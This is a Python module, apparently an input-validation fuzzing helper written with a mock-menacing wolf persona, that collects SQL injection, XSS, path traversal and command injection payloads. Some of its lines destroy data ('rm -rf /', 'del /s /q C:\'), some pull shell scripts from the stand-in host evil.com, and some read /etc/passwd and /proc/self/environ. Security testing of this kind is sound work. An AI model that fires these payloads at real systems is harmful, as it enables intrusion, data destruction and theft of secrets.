"""
🐺 ADVANCED PAYLOAD GENERATOR

*snarls with predatory glee* Generates the most devious payloads to break
your input validation and tear apart your security controls!
"""

import random
import string
from typing import List, Dict, Any, Optional
from dataclasses import dataclass

@dataclass
class PayloadCategory:
    """Category of attack payloads"""
    name: str
    payloads: List[str]
    description: str

class PayloadGenerator:
    """
    *circles with menacing intent* The ultimate payload generation engine
    
    *bares fangs with savage satisfaction* Creates payloads that will
    make your input validation weep with inadequacy!
    """
    
    def __init__(self):
        self.sql_injection_payloads = [
            "' OR 1=1 --",
            "' UNION SELECT NULL,NULL,NULL--",
            "admin'--",
            "admin' #",
            "' or '1'='1",
            "'; DROP TABLE users; --",
            "' OR 'x'='x",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
            "1' OR '1'='1' #",
            "' OR 1=1 LIMIT 1 --",
            "' OR 1=1 LIMIT 1 #",
            "' OR 1=1 LIMIT 1 /*",
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<math><mi//xlink:href=data:x,<script>alert('XSS')</script>>",
        ]
        
        self.path_traversal_payloads = [
            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/proc/self/cmdline",
            "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
            "....//....//....//....//....//etc//passwd",
            "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            "file:///etc/passwd",
            "\\share\\evil.txt",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cpuinfo",
            "/proc/meminfo",
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "& dir",
            "` id `",
            "$(whoami)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& type C:\\windows\\system32\\drivers\\etc\\hosts",
            "` cat /etc/passwd `",
            "$(cat /etc/passwd)",
            "; rm -rf /",
            "| rm -rf /",
            "& del /s /q C:\\",
            "` rm -rf / `",
            "$(rm -rf /)",
            "; wget http://evil.com/shell.sh",
            "| curl http://evil.com/shell.sh",
            "& powershell -c \"Invoke-WebRequest http://evil.com/shell.ps1\"",
        ]
        
        self.special_characters = [
            "\x00",  # Null byte
            "\n",    # Newline
            "\r\n",  # CRLF
            "\\",    # Backslash
            "\"",    # Double quote
            "'",     # Single quote
            "`",     # Backtick
            "|",     # Pipe
            "&",     # Ampersand
            ";",     # Semicolon
            "<",     # Less than
            ">",     # Greater than
            "(",     # Parenthesis open
            ")",     # Parenthesis close
            "{",     # Curly brace open
            "}",     # Curly brace close
            "[",     # Square bracket open
            "]",     # Square bracket close
            "*",     # Asterisk
            "?",     # Question mark
            "!",     # Exclamation mark
            "@",     # At symbol
            "#",     # Hash
            "$",     # Dollar sign
            "%",     # Percent
            "^",     # Caret
            "=",     # Equals
            "+",     # Plus
            ",",     # Comma
            ".",     # Dot
            "/",     # Slash
            "~",     # Tilde
        ]
        
        self.encoding_variants = [
            "url_encoded",
            "double_url_encoded", 
            "unicode_encoded",
            "html_encoded",
            "base64_encoded",
            "hex_encoded",
        ]
    
    def generate_random_string(self, length: int = 10) -> str:
        """Generate a random string of specified length"""
        return ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(length))
    
    def generate_malicious_path(self) -> str:
        """Generate a malicious path traversal payload"""
        return random.choice(self.path_traversal_payloads)
    
    def generate_sql_injection(self) -> str:
        """Generate a SQL injection payload"""
        return random.choice(self.sql_injection_payloads)
    
    def generate_xss_payload(self) -> str:
        """Generate an XSS payload"""
        return random.choice(self.xss_payloads)
    
    def generate_command_injection(self) -> str:
        """Generate a command injection payload"""
        return random.choice(self.command_injection_payloads)
    
    def generate_special_character_payload(self) -> str:
        """Generate a payload with special characters"""
        return random.choice(self.special_characters)
    
    def generate_long_string(self, length: int = 2000) -> str:
        """Generate a long string for buffer overflow testing"""
        return "a" * length
    
    def generate_null_byte_payload(self) -> str:
        """Generate a null byte payload"""
        return "test\x00.txt"
    
    def generate_unicode_payload(self) -> str:
        """Generate a Unicode payload"""
        return "test\u0000.txt"
    
    def generate_fuzzed_username(self) -> str:
        """Generate a fuzzed username"""
        fuzz_options = [
            self.generate_random_string(random.randint(1, 50)),
            self.generate_sql_injection(),
            self.generate_xss_payload(),
            self.generate_special_character_payload(),
            self.generate_long_string(100),
            "",
            " ",
            "null",
            "undefined",
            "0",
            "1",
            "-1",
        ]
        return random.choice(fuzz_options)
    
    def generate_fuzzed_password(self) -> str:
        """Generate a fuzzed password"""
        fuzz_options = [
            self.generate_random_string(random.randint(1, 50)),
            self.generate_sql_injection(),
            self.generate_xss_payload(),
            self.generate_special_character_payload(),
            self.generate_long_string(100),
            "",
            " ",
            "null",
            "undefined",
            "0",
            "1",
            "-1",
        ]
        return random.choice(fuzz_options)
    
    def generate_fuzzed_file_content(self, size: int = 1024) -> bytes:
        """Generate fuzzed file content"""
        return bytes(random.randint(0, 255) for _ in range(size))
    
    def generate_fuzzed_filename(self) -> str:
        """Generate a fuzzed filename"""
        extensions = ["png", "jpg", "webp", "gif", "txt", "php", "html", "js"]
        base_name = self.generate_random_string(10)
        extension = random.choice(extensions)
        
        # Sometimes add malicious content to filename
        if random.random() < 0.3:
            malicious_content = random.choice([
                self.generate_malicious_path(),
                self.generate_sql_injection(),
                self.generate_xss_payload(),
                self.generate_special_character_payload(),
            ])
            return f"{malicious_content}.{extension}"
        
        return f"{base_name}.{extension}"
    
    def get_all_payload_categories(self) -> List[PayloadCategory]:
        """Get all payload categories"""
        return [
            PayloadCategory(
                name="SQL Injection",
                payloads=self.sql_injection_payloads,
                description="SQL injection attack payloads"
            ),
            PayloadCategory(
                name="XSS",
                payloads=self.xss_payloads,
                description="Cross-site scripting attack payloads"
            ),
            PayloadCategory(
                name="Path Traversal",
                payloads=self.path_traversal_payloads,
                description="Path traversal attack payloads"
            ),
            PayloadCategory(
                name="Command Injection",
                payloads=self.command_injection_payloads,
                description="Command injection attack payloads"
            ),
            PayloadCategory(
                name="Special Characters",
                payloads=self.special_characters,
                description="Special character payloads"
            ),
        ]
    
    def generate_comprehensive_fuzz_set(self, count: int = 100) -> List[str]:
        """Generate a comprehensive set of fuzzing payloads"""
        payloads = []
        
        # Add payloads from each category
        for category in self.get_all_payload_categories():
            payloads.extend(category.payloads)
        
        # Add random variations
        for _ in range(count - len(payloads)):
            payloads.append(self.generate_random_string(random.randint(1, 100)))
        
        # Shuffle and return
        random.shuffle(payloads)
        return payloads[:count]
